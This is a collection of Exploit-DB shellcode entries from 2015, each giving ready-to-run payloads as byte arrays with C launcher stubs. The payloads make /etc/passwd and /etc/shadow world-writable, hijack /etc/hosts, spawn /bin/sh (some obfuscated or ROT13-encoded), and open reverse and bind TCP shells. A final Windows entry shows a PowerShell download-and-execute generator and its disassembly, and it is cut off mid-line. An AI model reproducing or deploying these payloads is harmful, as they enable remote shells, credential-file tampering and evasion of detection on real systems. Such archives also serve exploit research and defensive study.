{"Title": "Linux/MIPS (Little Endian) - chmod 666 /etc/passwd Shellcode (55 bytes)", "Author": "Sang Min Lee", "Published": ": 2015-03-05", "Platform": "Linux_MIPS", "Download": "https://old.exploit-db.com/download/36276.c", "View": "https://old.exploit-db.com/raw/36276/", "code": ["#include <stdio.h>", "", "/*", "\tTitle: Linux/MIPS (Little Endian) - chmod 666 /etc/passwd - 55 bytes", "\tDate: 2015-03-05", "\tAuthor: Sang-Min LEE ", "\tEmail: leesangmin144@gmail.com", "\tBlog: http://smleenull.tistory.com", "*/", "", "char sc[] = {", "\t\"\\xff\\xff\\x06\\x28\" // slti $a2, $zero, -1", "    \"\\xff\\xff\\xd0\\x04\" // bltzal $a2, p <p>", "    \"\\xff\\xff\\x05\\x28\" // slti $a1, $zero, -1", "    \"\\xb6\\x01\\x05\\x24\" // li $a1, 438", "    \"\\x01\\x10\\xe4\\x27\" // addu $a0, $ra, 4097", "    \"\\x1f\\xf0\\x84\\x24\" // addu $a0, $a0, -4065", "    \"\\xaf\\x0f\\x02\\x24\" // li $v0, 4015", "    \"\\x0c\\x01\\x01\\x01\" // syscall 0x40404", "    \"\\xff\\xff\\x04\\x28\" // slti $a0, $zero, -1", "    \"\\xa1\\x0f\\x02\\x24\" // li $v0, 4001", "    \"\\x0c\\x01\\x01\\x01\" // syscall 0x40404", "    \"/etc/passwd\"", "};", "", "/*", "Shellcode", "\\xff\\xff\\x06\\x28\\xff\\xff\\xd0\\x04\\xff\\xff\\x05\\x28\\xb6\\x01\\x05\\x24\\x01\\x10\\xe4\\x27\\x1f\\xf0\\x84\\x24\\xaf\\x0f\\x02\\x24\\x0c\\x01\\x01\\x01\\xff\\xff\\x04\\x28\\xa1\\x0f\\x02\\x24\\x0c\\x01\\x01\\x01\\x2f\\x65\\x74\\x63\\x2f\\x70\\x61\\x73\\x73\\x77\\x64", "*/", "", "void main ()", "{", "\tvoid (*s)(void);", "    printf(\"sc size %d\\n\", sizeof(sc));", "    s = sc;", "    s();", "}"]},
{"Title": "Linux/x86 - execve(/bin/sh) ROT13 Encoded Shellcode (68 bytes)", "Author": "Maximiliano Gomez Vidal", "Published": ": 2015-03-16", "Platform": "Linux_x86", "Download": "https://old.exploit-db.com/download/36391.c", "View": "https://old.exploit-db.com/raw/36391/", "code": ["/*  ", " *  Linux x86 - ROT13 encoded execve(\"/bin/sh\") - 68 bytes", " *  Author: xmgv", " *  Details: https://xmgv.wordpress.com/2015/03/04/slae-4-custom-shellcode-encoder/", " */", "", "/*", "global _start           ", "", "section .text", "", "_start:", "    jmp short call_decoder", "", "decoder:", "    pop esi                     ; shellcode address", "    xor ecx, ecx                ; zero out ecx", "    mov cl, len                 ; initialize counter", "", "decode:", "    cmp byte [esi], 0xD         ; can we substract 13?", "    jl wrap_around              ; nope, we need to wrap around", "    sub byte [esi], 0xD         ; substract 13", "    jmp short process_shellcode ; process the rest of the shellcode", "", "wrap_around:", "    xor edx, edx                ; zero out edx", "    mov dl, 0xD                 ; edx = 13", "    sub dl, byte [esi]          ; 13 - shellcode byte value", "    xor ebx,ebx                 ; zero out ebx", "    mov bl, 0xff                ; store 0x100 without introducing null bytes", "    inc ebx", "    sub bx, dx                  ; 256 - (13 - shellcode byte value)", "    mov byte [esi], bl          ; write decoded value", "", "process_shellcode:", "    inc esi                     ; move to the next byte", "    loop decode                 ; decode current byte", "    jmp short shellcode         ; execute decoded shellcode", "", "call_decoder:", "    call decoder", "    shellcode: ", "        db 0x3e,0xcd,0x5d,0x75,0x3c,0x3c,0x80,0x75,0x75,0x3c,0x6f,0x76,0x7b", "        db 0x96,0xf0,0x5d,0x96,0xef,0x60,0x96,0xee,0xbd,0x18,0xda,0x8d", "    len: equ $-shellcode", "*/", "", "#include <stdio.h>", "#include <string.h>", "", "unsigned char code[] =", "// Decoder stub:", "\"\\xeb\\x24\\x5e\\x31\\xc9\\xb1\\x19\\x80\\x3e\\x0d\\x7c\\x05\\x80\\x2e\\x0d\\xeb\\x10\\x31\\xd2\"", "\"\\xb2\\x0d\\x2a\\x16\\x31\\xdb\\xb3\\xff\\x43\\x66\\x29\\xd3\\x88\\x1e\\x46\\xe2\\xe3\\xeb\\x05\"", "\"\\xe8\\xd7\\xff\\xff\\xff\"", "// Encoded shellcode:", "\"\\x3e\\xcd\\x5d\\x75\\x3c\\x3c\\x80\\x75\\x75\\x3c\\x6f\\x76\\x7b\\x96\\xf0\\x5d\\x96\\xef\\x60\"", "\"\\x96\\xee\\xbd\\x18\\xda\\x8d\";", "", "int main(void) {", "    printf(\"Shellcode Length:  %d\\n\", strlen(code));", "    int (*ret)() = (int(*)())code;", "    ret();", "}"]},
{"Title": "Linux/x86 - chmod 0777 /etc/shadow + Obfuscated Shellcode (84 bytes)", "Author": "Maximiliano Gomez Vidal", "Published": ": 2015-03-16", "Platform": "Linux_x86", "Download": "https://old.exploit-db.com/download/36393.c", "View": "https://old.exploit-db.com/raw/36393/", "code": ["/*  ", " *  Linux x86 - execve chmod 0777 /etc/shadow", " *  Obfuscated version - 84 bytes", " *  Original: http://shell-storm.org/shellcode/files/shellcode-828.php", " *  Author: xmgv", " *  Details: https://xmgv.wordpress.com/2015/03/13/slae-6-polymorphic-shellcode/", " */", "", "/*", "global _start           ", "", "section .text", "", "_start:", "    sub edx, edx", "    push edx", "    mov eax, 0xb33fb33f", "    sub eax, 0x3bd04ede", "    push eax", "    jmp short two", "", "end:", "    int 0x80", "", "four:", "    push edx", "    push esi", "    push ebp", "    push ebx", "    mov ecx, esp", "    push byte 0xc", "    pop eax", "    dec eax", "    jmp short end", "", "three:", "    push edx", "    sub eax, 0x2c3d2dff", "    push eax", "    mov ebp, esp", "    push edx", "    add eax, 0x2d383638", "    push eax", "    sub eax, 0x013ffeff", "    push eax", "    sub eax, 0x3217d6d2", "    add eax, 0x31179798", "    push eax", "    mov ebx, esp", "    jmp short four", "", "two:", "    sub eax, 0x0efc3532", "    push eax", "    sub eax, 0x04feca01", "    inc eax", "    push eax", "    mov esi, esp", "    jmp short three", "*/", "", "#include <stdio.h>", "#include <string.h>", "", "unsigned char code[] =", "\"\\x29\\xd2\\x52\\xb8\\x3f\\xb3\\x3f\\xb3\\x2d\\xde\\x4e\\xd0\\x3b\\x50\\xeb\\x33\\xcd\\x80\"", "\"\\x52\\x56\\x55\\x53\\x89\\xe1\\x6a\\x0c\\x58\\x48\\xeb\\xf2\\x52\\x2d\\xff\\x2d\\x3d\\x2c\"", "\"\\x50\\x89\\xe5\\x52\\x05\\x38\\x36\\x38\\x2d\\x50\\x2d\\xff\\xfe\\x3f\\x01\\x50\\x2d\\xd2\"", "\"\\xd6\\x17\\x32\\x05\\x98\\x97\\x17\\x31\\x50\\x89\\xe3\\xeb\\xcf\\x2d\\x32\\x35\\xfc\\x0e\"", "\"\\x50\\x2d\\x01\\xca\\xfe\\x04\\x40\\x50\\x89\\xe6\\xeb\\xca\";", "", "", "int main() {", "    printf(\"Shellcode Length:  %d\\n\", strlen(code));", "    int (*ret)() = (int(*)())code;", "    ret();", "}"]},
{"Title": "Linux/x86 - Add Map (127.1.1.1 google.com) In /etc/hosts Obfuscated Shellcode (98 bytes)", "Author": "Maximiliano Gomez Vidal", "Published": ": 2015-03-16", "Platform": "Linux_x86", "Download": "https://old.exploit-db.com/download/36394.c", "View": "https://old.exploit-db.com/raw/36394/", "code": ["/*  ", " *  Linux x86 - map google.com to 127.1.1.1 in /etc/hosts", " *  Obfuscated version - 98 bytes", " *  Original: http://shell-storm.org/shellcode/files/shellcode-893.php", " *  Author: xmgv", " *  Details: https://xmgv.wordpress.com/2015/03/13/slae-6-polymorphic-shellcode/", " */", "", "/*", "global _start", "", "section .text", "", "_start:", "    push byte 0x4", "    pop eax", "    inc eax", "    sub edx, edx", "    push edx", "    mov ecx, 0x88998899", "    sub ecx, 0x1525152A", "    push ecx", "    sub ecx, 0x0B454440", "    push ecx", "    sub ecx, 0x04BACA01", "    inc ecx", "    push ecx", "    sub ecx, 0x6374612E", "    mov ebx, esp", "    int 0x80", "    xchg eax, ebx", "    jmp short _load_data", "", "_write:", "    pop eax", "    xchg eax, ecx", "    push byte 0x3", "    pop esi", "    mov eax, esi", "    inc eax", "    push len", "    pop edx", "    int 0x80", "    inc esi", "    inc esi", "    inc esi", "    xchg eax, esi", "    int 0x80", "    inc eax", "    int 0x80", "", "_load_data:", "    call _write", "    google: db \"127.1.1.1 google.com\"", "    len: equ $-google", "", "_random:", "    cld", "    xor esi,esi", "    cld", "*/", "", "#include <stdio.h>", "#include <string.h>", "", "unsigned char code[] =", "\"\\x6a\\x04\\x58\\x40\\x29\\xd2\\x52\\xb9\\x99\\x88\\x99\\x88\\x81\\xe9\\x2a\\x15\\x25\\x15\"", "\"\\x51\\x81\\xe9\\x40\\x44\\x45\\x0b\\x51\\x81\\xe9\\x01\\xca\\xba\\x04\\x41\\x51\\x81\\xe9\"", "\"\\x2e\\x61\\x74\\x63\\x89\\xe3\\xcd\\x80\\x93\\xeb\\x16\\x58\\x91\\x6a\\x03\\x5e\\x89\\xf0\"", "\"\\x40\\x6a\\x14\\x5a\\xcd\\x80\\x46\\x46\\x46\\x96\\xcd\\x80\\x40\\xcd\\x80\\xe8\\xe5\\xff\"", "\"\\xff\\xff\\x31\\x32\\x37\\x2e\\x31\\x2e\\x31\\x2e\\x31\\x20\\x67\\x6f\\x6f\\x67\\x6c\\x65\"", "\"\\x2e\\x63\\x6f\\x6d\\xfc\\x31\\xf6\\xfc\";", "", "int main() {", "    printf(\"Shellcode Length:  %d\\n\", strlen(code));", "    int (*ret)() = (int(*)())code;", "    ret();", "}"]},
{"Title": "Linux/x86 - execve(/bin/sh) + Obfuscated Shellcode (40 bytes)", "Author": "Maximiliano Gomez Vidal", "Published": ": 2015-03-16", "Platform": "Linux_x86", "Download": "https://old.exploit-db.com/download/36395.c", "View": "https://old.exploit-db.com/raw/36395/", "code": ["/*  ", " *  Linux x86 - execve(\"/bin/sh\") shellcode", " *  Obfuscated version - 40 bytes", " *  Original: http://shell-storm.org/shellcode/files/shellcode-811.php", " *  Author: xmgv", " *  Details: https://xmgv.wordpress.com/2015/03/13/slae-6-polymorphic-shellcode/", " */", "", "/*", "global _start           ", "", "section .text", "", "_start:", "    xor edx, edx    ", "    push edx", "    mov eax, 0x563ED8B7", "    add eax, 0x12345678", "    push eax", "    mov eax, 0xDEADC0DE", "    sub eax, 0x70445EAF", "    push eax", "    push byte 0xb", "    pop eax", "    mov ecx, edx", "    mov ebx, esp", "    push byte 0x1", "    pop esi", "    int 0x80", "    xchg esi, eax", "    int 0x80", "*/", "", "#include <stdio.h>", "#include <string.h>", "", "unsigned char code[] =", "\"\\x31\\xd2\\x52\\xb8\\xb7\\xd8\\x3e\\x56\\x05\\x78\\x56\\x34\\x12\\x50\\xb8\\xde\\xc0\\xad\"", "\"\\xde\\x2d\\xaf\\x5e\\x44\\x70\\x50\\x6a\\x0b\\x58\\x89\\xd1\\x89\\xe3\\x6a\\x01\\x5e\\xcd\"", "\"\\x80\\x96\\xcd\\x80\";", "", "int main() {", "    printf(\"Shellcode Length:  %d\\n\", strlen(code));", "    int (*ret)() = (int(*)())code;", "    ret();", "}"]},
{"Title": "Linux/x86 - Reverse (192.168.1.133:33333/TCP) Shell (/bin/sh) Shellcode (72 bytes)", "Author": "Maximiliano Gomez Vidal", "Published": ": 2015-03-16", "Platform": "Linux_x86", "Download": "https://old.exploit-db.com/download/36397.c", "View": "https://old.exploit-db.com/raw/36397/", "code": ["/*  ", " *  Linux x86 - Reverse TCP Shell - 72 bytes", " *  Author: xmgv", " *  Details: https://xmgv.wordpress.com/2015/02/21/slae-assignment-2-reverse-shell/", " */", "", "/*", "global _start           ", "", "section .text", "", "_start:", "    ; socket(AF_INET, SOCK_STREAM, 0);", "    push 0x66           ; socketcall()", "    pop eax", "    cdq                 ; zero out edx", "    push edx            ; protocol", "    inc edx", "    push edx            ; SOCK_STREAM", "    mov ebx, edx        ; socket()", "    inc edx", "    push edx            ; AF_INET", "    mov ecx, esp        ; load address of the parameter array", "    int 0x80            ; call socketcall()", "", "    ; dup2()", "    xchg ebx, eax       ; store sockfd in ebx", "    mov ecx, edx        ; initialize counter to 2", "    loop:", "        mov al, 0x3f    ", "        int 0x80", "        dec ecx", "        jns loop", "", "    ; connect(sockfd, (struct sockaddr *)&serv_addr, sizeof(serv_addr));", "    mov al, 0x66        ; socketcall()", "    xchg ebx, edx       ; ebx=2, edx=sockfd", "    push 0x8501A8C0     ; 192.168.1.133", "    push word 0x3582    ; port", "    push word bx        ; AF_INET   ", "    inc ebx             ; connect() -> 3", "    mov ecx, esp        ; point to the structure", "    push 0x10           ; sizeof(struct sockaddr_in)", "    push ecx            ; &serv_addr", "    push edx            ; sockfd", "    mov ecx, esp        ; load address of the parameter array", "    int 0x80            ; call socketcall()", "", "    ; execve(\u201c/bin/sh\u201d, NULL , NULL);", "    push 0xb            ; execve()", "    pop eax", "    cdq                 ; zero out edx", "    mov ecx, edx        ; zero out ecx", "    push edx            ; push null bytes (terminate string)", "    push 0x68732f2f     ; //sh", "    push 0x6e69622f     ; /bin", "    mov ebx, esp        ; load address of /bin/sh", "    int 0x80            ; call execve()", "*/", "", "#include <stdio.h>", "#include <string.h>", "", "unsigned char code[] = \\", "\"\\x6a\\x66\\x58\\x99\\x52\\x42\\x52\\x89\\xd3\\x42\\x52\\x89\\xe1\\xcd\\x80\\x93\\x89\\xd1\\xb0\"", "\"\\x3f\\xcd\\x80\\x49\\x79\\xf9\\xb0\\x66\\x87\\xda\\x68\"", "\"\\xc0\\xa8\\x01\\x85\"\t// <--- ip address", "\"\\x66\\x68\"", "\"\\x82\\x35\"\t\t\t// <--- tcp port", "\"\\x66\\x53\\x43\\x89\\xe1\\x6a\\x10\\x51\\x52\\x89\\xe1\\xcd\\x80\\x6a\\x0b\\x58\\x99\\x89\\xd1\"", "\"\\x52\\x68\\x2f\\x2f\\x73\\x68\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe3\\xcd\\x80\";", "", "int main(void) {", "\tprintf(\"Shellcode Length:  %d\\n\", strlen(code));", "\tint (*ret)() = (int(*)())code;", "\tret();", "}"]},
{"Title": "Linux/x86 - Bind (33333/TCP) Shell (/bin/sh) Shellcode (96 bytes)", "Author": "Maximiliano Gomez Vidal", "Published": ": 2015-03-16", "Platform": "Linux_x86", "Download": "https://old.exploit-db.com/download/36398.c", "View": "https://old.exploit-db.com/raw/36398/", "code": ["/*  ", " *  Linux x86 - TCP Bind Shell - 96 bytes", " *  Author: xmgv", " *  Details: https://xmgv.wordpress.com/2015/02/19/28/", " */", "", "/*", "global _start           ", "", "section .text", "", "_start:", "    xor ebx, ebx    ; zero out ebx", "    mul ebx         ; zero out eax, edx", "", "    ;  socket(AF_INET, SOCK_STREAM, 0);", "    mov al, 102     ; socketcall()", "    mov bl, 1       ; socket()", "    push edx        ; protocol", "    push ebx        ; SOCK_STREAM", "    push 2          ; AF_INET", "    mov ecx, esp    ; load address of the parameter array", "    int 0x80        ; call socketcall()", "", "    ; eax contains the newly created socket", "    mov esi, eax", "", "    ; bind(sockfd, (struct sockaddr *)&serv_addr, sizeof(serv_addr));", "    mov al, 102     ; socketcall()", "    inc ebx         ; bind() - 2", "    push edx          ; INADDR_ANY", "    push word 0x3582 ; port", "    push word bx     ; AF_INET", "    mov ecx, esp    ; point to the structure", "    push 16         ; sizeof(struct sockaddr_in)", "    push ecx        ; &serv_addr", "    push esi        ; sockfd", "    mov ecx, esp    ; load address of the parameter array", "    int 0x80        ; call socketcall()", "", "    ; listen(sockfd, backlog);", "    mov al, 102     ; socketcall()", "    mov bl, 4       ; listen()", "    push edx        ; backlog", "    push esi        ; sockfd", "    mov ecx, esp    ; load address of the parameter array", "    int 0x80        ; call socketcall()", "", "    ; accept(sockfd, (struct sockaddr *)&cli_addr, &sin_size);", "    mov al, 102     ; socketcall()", "    mov bl, 5       ; accept()", "    push edx          ; zero addrlen", "    push edx          ; null sockaddr", "    push esi        ; sockfd", "    mov ecx, esp    ; load address of the parameter array", "    int 0x80        ; call socketcall()", "", "    ; eax contains the descriptor for the accepted socket", "    xchg ebx, eax", "", "    xor ecx, ecx    ; zero out ecx", "    mov cl, 2       ; initialize counter", "", "    loop:", "        ; dup2(connfd, 0);", "        mov al, 63  ; dup2()", "        int 0x80", "        dec ecx", "        jns loop", "", "    ; execve(\u201c/bin/sh\u201d, [\u201c/bin/sh\u201d, NULL], NULL);", "    xchg eax, edx", "    push eax        ; push null bytes (terminate string)", "    push 0x68732f2f ; //sh", "    push 0x6e69622f ; /bin", "    mov ebx, esp    ; load address of /bin/sh", "    push eax        ; null terminator", "    push ebx        ; push address of /bin/sh ", "    mov ecx, esp    ; load array address ", "    push eax        ; push null terminator", "    mov edx, esp    ; empty envp array", "    mov al, 11      ; execve()", "    int 0x80        ; call execve()", "*/", "", "#include <stdio.h>", "#include <string.h>", "", "#define PORT_NUMBER \"\\x82\\x35\" // 33333", "", "unsigned char code[] =", "\"\\x31\\xdb\\xf7\\xe3\\xb0\\x66\\xb3\\x01\\x52\\x53\\x6a\\x02\\x89\\xe1\\xcd\\x80\\x89\\xc6\\xb0\"", "\"\\x66\\x43\\x52\\x66\\x68\"", "PORT_NUMBER", "\"\\x66\\x53\\x89\\xe1\\x6a\\x10\\x51\\x56\\x89\\xe1\\xcd\\x80\\xb0\\x66\\xb3\\x04\\x52\\x56\\x89\"", "\"\\xe1\\xcd\\x80\\xb0\\x66\\xb3\\x05\\x52\\x52\\x56\\x89\\xe1\\xcd\\x80\\x93\\x31\\xc9\\xb1\\x02\"", "\"\\xb0\\x3f\\xcd\\x80\\x49\\x79\\xf9\\x92\\x50\\x68\\x2f\\x2f\\x73\\x68\\x68\\x2f\\x62\\x69\\x6e\"", "\"\\x89\\xe3\\x50\\x53\\x89\\xe1\\x50\\x89\\xe2\\xb0\\x0b\\xcd\\x80\";", "", "int main(void) {", "    printf(\"Shellcode Length:  %d\\n\", strlen(code));", "    int (*ret)() = (int(*)())code;", "    ret();", "}"]},
{"Title": "Windows/x64 (XP) - Download File + Execute Shellcode Using Powershell (Generator)", "Author": "Ali Razmjoo", "Published": ": 2015-03-16", "Platform": "Generator", "Download": "http://shell-storm.org/shellcode/files/shellcode-899.php", "View": null, "code": ["#Title: Obfuscated Shellcode Windows x86/x64 Download And Execute [Use PowerShell] - Generator", "#length: Dynamic ! depend on url and filename", "#Date: 20 January 2015", "#Author: Ali Razmjoo", "#tested On: Windows 7 x64 ultimate", "#WinExec =>  0x77b1e695", "#ExitProcess =>  0x77ae2acf", "#====================================", "#Execute :", "#powershell -command \"& { (New-Object Net.WebClient).DownloadFile('http://tartarus.org/~simon/putty-prerel-snapshots/x86/putty.exe', 'D:\\Ali.exe')};D:\\Ali.exe\"", "#====================================", "#Ali Razmjoo , ['Ali.Razmjoo1994@Gmail.Com','Ali@Z3r0D4y.Com']", "#Thanks to my friends , Dariush Nasirpour and Ehsan Nezami", "####################################################", "#How it work ?", "'''", "C:\\Users\\Ali\\Desktop>python \"Windows x86 Download And Execute.py\"", "Enter url", "Example: http://z3r0d4y.com/file.exe", "Enter:http://tartarus.org/~simon/putty-prerel-snapshots/x86/putty.exe", "Enter filename", "Example: D:\\file.exe", "Enter:C:\\Ali.exe", "C:\\Users\\Ali\\Desktop>nasm -f elf shellcode.asm -o shellcode.o", "C:\\Users\\Ali\\Desktop>objdump -D shellcode.o", "shellcode.o:     file format elf32-i386", "Disassembly of section .text:", "00000000 <.text>:", "   0:   31 c0                   xor    %eax,%eax", "   2:   50                      push   %eax", "   3:   68 41 41 65 22          push   $0x22654141", "   8:   58                      pop    %eax", "   9:   c1 e8 08                shr    $0x8,%eax", "   c:   c1 e8 08                shr    $0x8,%eax", "   f:   50                      push   %eax", "  10:   b8 34 47 0b 4d          mov    $0x4d0b4734,%eax", "  15:   bb 5d 69 6e 35          mov    $0x356e695d,%ebx", "  1a:   31 d8                   xor    %ebx,%eax", "  1c:   50                      push   %eax", "  1d:   b8 43 32 10 22          mov    $0x22103243,%eax", "  22:   bb 79 6e 51 4e          mov    $0x4e516e79,%ebx", "  27:   31 d8                   xor    %ebx,%eax", "  29:   50                      push   %eax", "  2a:   b8 60 05 42 32          mov    $0x32420560,%eax", "  2f:   bb 49 78 79 71          mov    $0x71797849,%ebx", "  34:   31 d8                   xor    %ebx,%eax", "  36:   50                      push   %eax", "  37:   b8 0f 1c 2c 14          mov    $0x142c1c0f,%eax", "  3c:   bb 6a 64 49 33          mov    $0x3349646a,%ebx", "  41:   31 d8                   xor    %ebx,%eax", "  43:   50                      push   %eax", "  44:   b8 07 3e 0b 40          mov    $0x400b3e07,%eax", "  49:   bb 46 52 62 6e          mov    $0x6e625246,%ebx", "  4e:   31 d8                   xor    %ebx,%eax", "  50:   50                      push   %eax", "  51:   b8 44 0a 78 07          mov    $0x7780a44,%eax", "  56:   bb 63 49 42 5b          mov    $0x5b424963,%ebx", "  5b:   31 d8                   xor    %ebx,%eax", "  5d:   50                      push   %eax", "  5e:   b8 0f 16 4b 0d          mov    $0xd4b160f,%eax", "  63:   bb 6a 31 67 2d          mov    $0x2d67316a,%ebx", "  68:   31 d8                   xor    %ebx,%eax", "  6a:   50                      push   %eax", "  6b:   b8 18 62 5c 1f          mov    $0x1f5c6218,%eax", "  70:   bb 61 4c 39 67          mov    $0x67394c61,%ebx", "  75:   31 d8                   xor    %ebx,%eax", "  77:   50                      push   %eax", "  78:   b8 1b 2d 1e 1f          mov    $0x1f1e2d1b,%eax", "  7d:   bb 6b 58 6a 6b          mov    $0x6b6a586b,%ebx", "  82:   31 d8                   xor    %ebx,%eax", "  84:   50                      push   %eax", "  85:   b8 45 40 41 66          mov    $0x66414045,%eax", "  8a:   bb 3d 78 77 49          mov    $0x4977783d,%ebx", "  8f:   31 d8                   xor    %ebx,%eax", "  91:   50                      push   %eax", "  92:   b8 02 1f 4b 45          mov    $0x454b1f02,%eax", "  97:   bb 6d 6b 38 6a          mov    $0x6a386b6d,%ebx", "  9c:   31 d8                   xor    %ebx,%eax", "  9e:   50                      push   %eax", "  9f:   b8 24 3e 19 32          mov    $0x32193e24,%eax", "  a4:   bb 45 4e 6a 5a          mov    $0x5a6a4e45,%ebx", "  a9:   31 d8                   xor    %ebx,%eax", "  ab:   50                      push   %eax", "  ac:   b8 00 5e 3a 35          mov    $0x353a5e00,%eax", "  b1:   bb 6c 73 49 5b          mov    $0x5b49736c,%ebx", "  b6:   31 d8                   xor    %ebx,%eax", "  b8:   50                      push   %eax", "  b9:   b8 1f 37 40 24          mov    $0x2440371f,%eax", "  be:   bb 6d 52 32 41          mov    $0x4132526d,%ebx", "  c3:   31 d8                   xor    %ebx,%eax", "  c5:   50                      push   %eax", "  c6:   b8 2e 35 68 31          mov    $0x3168352e,%eax", "  cb:   bb 5a 4c 45 41          mov    $0x41454c5a,%ebx", "  d0:   31 d8                   xor    %ebx,%eax", "  d2:   50                      push   %eax", "  d3:   b8 48 1e 1c 15          mov    $0x151c1e48,%eax", "  d8:   bb 67 6e 69 61          mov    $0x61696e67,%ebx", "  dd:   31 d8                   xor    %ebx,%eax", "  df:   50                      push   %eax", "  e0:   b8 26 28 0d 5d          mov    $0x5d0d2826,%eax", "  e5:   bb 4f 45 62 33          mov    $0x3362454f,%ebx", "  ea:   31 d8                   xor    %ebx,%eax", "  ec:   50                      push   %eax", "  ed:   b8 20 57 1d 45          mov    $0x451d5720,%eax", "  f2:   bb 47 78 63 36          mov    $0x36637847,%ebx", "  f7:   31 d8                   xor    %ebx,%eax", "  f9:   50                      push   %eax", "  fa:   b8 04 6a 24 3b          mov    $0x3b246a04,%eax", "  ff:   bb 77 44 4b 49          mov    $0x494b4477,%ebx", " 104:   31 d8                   xor    %ebx,%eax", " 106:   50                      push   %eax", " 107:   b8 18 0f 0a 32          mov    $0x320a0f18,%eax", " 10c:   bb 6c 6e 78 47          mov    $0x47786e6c,%ebx", " 111:   31 d8                   xor    %ebx,%eax", " 113:   50                      push   %eax", " 114:   b8 7d 18 3c 27          mov    $0x273c187d,%eax", " 119:   bb 52 6c 5d 55          mov    $0x555d6c52,%ebx", " 11e:   31 d8                   xor    %ebx,%eax", " 120:   50                      push   %eax", " 121:   b8 03 44 60 60          mov    $0x60604403,%eax", " 126:   bb 77 34 5a 4f          mov    $0x4f5a3477,%ebx", " 12b:   31 d8                   xor    %ebx,%eax", " 12d:   50                      push   %eax", " 12e:   b8 47 6b 1f 20          mov    $0x201f6b47,%eax", " 133:   bb 6f 4c 77 54          mov    $0x54774c6f,%ebx", " 138:   31 d8                   xor    %ebx,%eax", " 13a:   50                      push   %eax", " 13b:   b8 2a 5e 2b 20          mov    $0x202b5e2a,%eax", " 140:   bb 6c 37 47 45          mov    $0x4547376c,%ebx", " 145:   31 d8                   xor    %ebx,%eax", " 147:   50                      push   %eax", " 148:   b8 59 07 12 0e          mov    $0xe120759,%eax", " 14d:   bb 35 68 73 6a          mov    $0x6a736835,%ebx", " 152:   31 d8                   xor    %ebx,%eax", " 154:   50                      push   %eax", " 155:   b8 01 59 11 2c          mov    $0x2c115901,%eax", " 15a:   bb 45 36 66 42          mov    $0x42663645,%ebx", " 15f:   31 d8                   xor    %ebx,%eax", " 161:   50                      push   %eax", " 162:   b8 22 22 4e 5a          mov    $0x5a4e2222,%eax", " 167:   bb 4c 56 67 74          mov    $0x7467564c,%ebx", " 16c:   31 d8                   xor    %ebx,%eax", " 16e:   50                      push   %eax", " 16f:   b8 00 37 1b 48          mov    $0x481b3700,%eax", " 174:   bb 43 5b 72 2d          mov    $0x2d725b43,%ebx", " 179:   31 d8                   xor    %ebx,%eax", " 17b:   50                      push   %eax", " 17c:   b8 4a 1f 22 13          mov    $0x13221f4a,%eax", " 181:   bb 64 48 47 71          mov    $0x71474864,%ebx", " 186:   31 d8                   xor    %ebx,%eax", " 188:   50                      push   %eax", " 189:   b8 6a 23 03 18          mov    $0x1803236a,%eax", " 18e:   bb 4a 6d 66 6c          mov    $0x6c666d4a,%ebx", " 193:   31 d8                   xor    %ebx,%eax", " 195:   50                      push   %eax", " 196:   b8 2d 54 57 1c          mov    $0x1c57542d,%eax", " 19b:   bb 47 31 34 68          mov    $0x68343147,%ebx", " 1a0:   31 d8                   xor    %ebx,%eax", " 1a2:   50                      push   %eax", " 1a3:   b8 4e 15 36 5a          mov    $0x5a36154e,%eax", " 1a8:   bb 39 38 79 38          mov    $0x38793839,%ebx", " 1ad:   31 d8                   xor    %ebx,%eax", " 1af:   50                      push   %eax", " 1b0:   b8 59 7f 1f 04          mov    $0x41f7f59,%eax", " 1b5:   bb 79 57 51 61          mov    $0x61515779,%ebx", " 1ba:   31 d8                   xor    %ebx,%eax", " 1bc:   50                      push   %eax", " 1bd:   b8 47 56 1d 2f          mov    $0x2f1d5647,%eax", " 1c2:   bb 65 70 3d 54          mov    $0x543d7065,%ebx", " 1c7:   31 d8                   xor    %ebx,%eax", " 1c9:   50                      push   %eax", " 1ca:   b8 2c 18 08 54          mov    $0x5408182c,%eax", " 1cf:   bb 4d 76 6c 74          mov    $0x746c764d,%ebx", " 1d4:   31 d8                   xor    %ebx,%eax", " 1d6:   50                      push   %eax", " 1d7:   b8 5a 34 58 1b          mov    $0x1b58345a,%eax", " 1dc:   bb 39 5b 35 76          mov    $0x76355b39,%ebx", " 1e1:   31 d8                   xor    %ebx,%eax", " 1e3:   50                      push   %eax", " 1e4:   b8 3f 0f 4b 41          mov    $0x414b0f3f,%eax", " 1e9:   bb 53 63 6b 6c          mov    $0x6c6b6353,%ebx", " 1ee:   31 d8                   xor    %ebx,%eax", " 1f0:   50                      push   %eax", " 1f1:   b8 4a 1e 59 0b          mov    $0xb591e4a,%eax", " 1f6:   bb 38 6d 31 6e          mov    $0x6e316d38,%ebx", " 1fb:   31 d8                   xor    %ebx,%eax", " 1fd:   50                      push   %eax", " 1fe:   b8 49 2b 16 2a          mov    $0x2a162b49,%eax", " 203:   bb 39 44 61 4f          mov    $0x4f614439,%ebx", " 208:   31 d8                   xor    %ebx,%eax", " 20a:   50                      push   %eax", " 20b:   89 e0                   mov    %esp,%eax", " 20d:   bb 41 41 41 01          mov    $0x1414141,%ebx", " 212:   c1 eb 08                shr    $0x8,%ebx", " 215:   c1 eb 08                shr    $0x8,%ebx", " 218:   c1 eb 08                shr    $0x8,%ebx", " 21b:   53                      push   %ebx", " 21c:   50                      push   %eax", " 21d:   bb 95 e6 b1 77          mov    $0x77b1e695,%ebx", " 222:   ff d3                   call   *%ebx", " 224:   bb cf 2a ae 77          mov    $0x77ae2acf,%ebx", " 229:   ff d3                   call   *%ebx", "C:\\Users\\Ali\\Desktop>", "#you have your shellcode now", "=======================================", "shellcode.c", "#include <stdio.h>", "#include <string.h>", "int main(){", "unsigned char shellcode[]= 